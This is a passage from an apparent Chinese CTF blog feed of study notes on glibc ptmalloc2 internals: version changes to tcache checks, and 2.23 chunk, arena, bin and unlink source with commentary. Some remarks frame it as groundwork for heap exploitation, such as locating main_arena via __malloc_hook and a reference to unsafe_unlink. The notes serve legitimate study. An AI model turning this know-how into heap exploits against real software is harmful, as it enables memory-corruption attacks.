class="hljs-comment">//现fd^地址&gt;&gt;12</span><br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-33"><a href="#2-33" class="headerlink" title="2.33"></a>2.33</h1><ul><li>增加Memory tagging机制，没看懂但好像没大问题（</li><li>_int_free的tcache操作增加count超标检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-type">size_t</span> cnt = <span class="hljs-number">0</span>;<br>   LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>   <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)<br>     &#123;<br><span class="hljs-keyword">if</span> (cnt &gt;= mp_.tcache_count)<br>  malloc_printerr (<span class="hljs-string">&quot;free(): too many chunks detected in tcache&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-34"><a href="#2-34" class="headerlink" title="2.34"></a>2.34</h1><ul><li>增加tcache_key机制，用随机数代替tcache标记检查double free<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> tcache_key;<br><br><span class="hljs-comment">/* The value of tcache_key does not really have to be a cryptographically</span><br><span class="hljs-comment">   secure random number.  It only needs to be arbitrary enough so that it does</span><br><span class="hljs-comment">   not collide with values present in applications.  If a collision does happen</span><br><span class="hljs-comment">   consistently enough, it could cause a degradation in performance since the</span><br><span class="hljs-comment">   entire list is checked to check if the block indeed has been freed the</span><br><span class="hljs-comment">   second time.  The odds of this happening are exceedingly low though, about 1</span><br><span class="hljs-comment">   in 2^wordsize.  There is probably a higher chance of the performance</span><br><span class="hljs-comment">   degradation being due to a double free where the first free happened in a</span><br><span class="hljs-comment">   different thread; that&#x27;s a case this check does not cover.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_key_initialize</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (__getrandom (&amp;tcache_key, <span class="hljs-keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)<br>      != <span class="hljs-keyword">sizeof</span> (tcache_key))<br>    &#123;<br>      tcache_key = random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __WORDSIZE == 64</span><br>      tcache_key = (tcache_key &lt;&lt; <span class="hljs-number">32</span>) | random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>删除了所有的hook及其相关函数和利用&#x2F;(ㄒoㄒ)&#x2F;~~</li></ul><h1 id="2-35"><a href="#2-35" class="headerlink" title="2.35"></a>2.35</h1><p>无</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>source code</tag>
      
      <tag>ptmalloc2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.23堆相关源码阅读笔记</title>
    <link href="/2023/01/20/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/01/20/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>做hgame-week2的堆题时发现自己对于堆的malloc和free相关机制还没有建立一个整体的结构印象，所以决定从源码阅读开始建构关于堆的知识体系。<br>这是我假期堆学习计划的开始，也是博客建立后的第一篇文章，纪念一下。(ง •_•)ง</p><span id="more"></span><h1 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p>malloc_chunk结构体源码（size只有M和P标志位）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//低地址</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><span class="hljs-comment">//高地址</span><br></code></pre></td></tr></table></figure><p>相关注释注意事项：   </p><ul><li>chunk的size成员、下一个chunk的pre_size成员以及它们的P位决定了free chunk的合并，这一点在后续相关函数的源码中也有体现</li><li>堆指针实际指向chunk的size成员，返回给用户的指针则指向chunk的data部分，即fd成员</li><li>堆地址对其0x10（本文所有保证兼容性的操作都以64位系统为例），具体对齐方式见后续相关函数</li><li>top chunk从低地址开始切分</li><li>如果剩余堆空间不够分配，则启用mmap()进行分配，同时将分配出来的chunk的M位置1</li></ul><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p>malloc_state结构体源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br><br><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>注意事项：   </p><ul><li>主线程的malloc_state即main_arena保存在libc.so的数据段中</li><li>运行时malloc_arena在malloc_hook上方不远处，因此可以用malloc_hook定位main_arena</li></ul><h1 id="相关宏定义"><a href="#相关宏定义" class="headerlink" title="相关宏定义"></a>相关宏定义</h1><h2 id="大小、对齐检查及转化"><a href="#大小、对齐检查及转化" class="headerlink" title="大小、对齐检查及转化"></a>大小、对齐检查及转化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">//堆地址和用户地址相隔一个size成员和一个pre_size成员</span><br><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">//0x10对齐检查，MALLOC_ALIGNMENT是malloc的最小对齐参数(0x10)，MALLOC_ALIGN_MASK（0xf）</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MALLOC_ALIGNMENT</span><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="hljs-meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* The corresponding bit mask value */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                             \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);      \</span><br><span class="hljs-meta">      return 0;      \</span><br><span class="hljs-meta">    &#125;      \</span><br><span class="hljs-meta">  (sz) = request2size (req);</span><br></code></pre></td></tr></table></figure><p>重点解释一下request2size(req)</p><ul><li>当req&lt;MINSIZE-MALLOC_ALIGN_MASK-SIZE_SZ(0x9)时，返回0x20（满足pre_size+size+fd+bk所需大小）</li><li>req&#x3D;n(0x10)+0x8时（n&gt;0），返回(n+1)(0x10)，chunk本身的data部分n(0x10)，nextchunk的pre_size0x10也用作data</li><li>req&#x3D;n(0x10)时（n&gt;0），返回(n+1)(0x10)，data为n(0x10)</li><li>checked_request2size比request2size多一步检查数据范围，更安全</li></ul><h2 id="chunk相关掩码操作"><a href="#chunk相关掩码操作" class="headerlink" title="chunk相关掩码操作"></a>chunk相关掩码操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_MMAPPED 0x2</span><br><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><br><span class="hljs-comment">/* check for chunk from non-main arena */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span><br><br><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span><br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)      \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span><br><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse(p)      \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span><br><span class="hljs-comment">//chunk的使用状态是由nextchunk的pre_inuse位判断的</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse(p)      \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse_bit_at_offset(p, s)      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse_bit_at_offset(p, s)      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse_bit_at_offset(p, s)      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br><br><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head_size(p, s)  ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span><br><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span><br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>chunk大部分操作都可以“顾名思义”</li><li>以上源码可以体现chunk的寻址是由pre_size和size决定的</li></ul><h2 id="bins相关源码"><a href="#bins相关源码" class="headerlink" title="bins相关源码"></a>bins相关源码</h2><h3 id="bins通用宏定义"><a href="#bins通用宏定义" class="headerlink" title="bins通用宏定义"></a>bins通用宏定义</h3><p>bins部分总注释略，大意：</p><ul><li>bins中共有128个bin链，bin链为双链表</li><li>bin链按所含chunk的范围大小排布</li><li>一条bin链中的chunk遵循FIFO原则</li><li>！bins数组元素被看作chunk的bk和fd，这个思维在源码理解时非常重要<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mbinptr</span>;</span><br><br><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-comment">//定义中不存在bin 0，bin 1为unsorted bin（所以-1），一个bin占用bins的两个元素（所以*2）</span><br><span class="hljs-comment">//bins数组元素被看作chunk的fd和bk（所以减去fd成员在结构体malloc_chunk中的偏移）</span><br><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><span class="hljs-comment">//bin链中的第一个chunk由bin的fd决定，最后一个chunk由bk决定</span><br><br><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;      \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;      \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="hljs-meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">      malloc_printerr (check_action,      \</span><br><span class="hljs-meta">       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">       P, AV);      \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="hljs-meta">                  &#125;      \</span><br><span class="hljs-meta">              &#125; <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">              &#125;      \</span><br><span class="hljs-meta">          &#125;      \</span><br><span class="hljs-meta">      &#125;      \</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-comment">//从bin链中摘除chunk P，相关解释见unsafe_unlink</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="chunk在bins中定址相关宏定义"><a href="#chunk在bins中定址相关宏定义" class="headerlink" title="chunk在bins中定址相关宏定义"></a>chunk在bins中定址相关宏定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 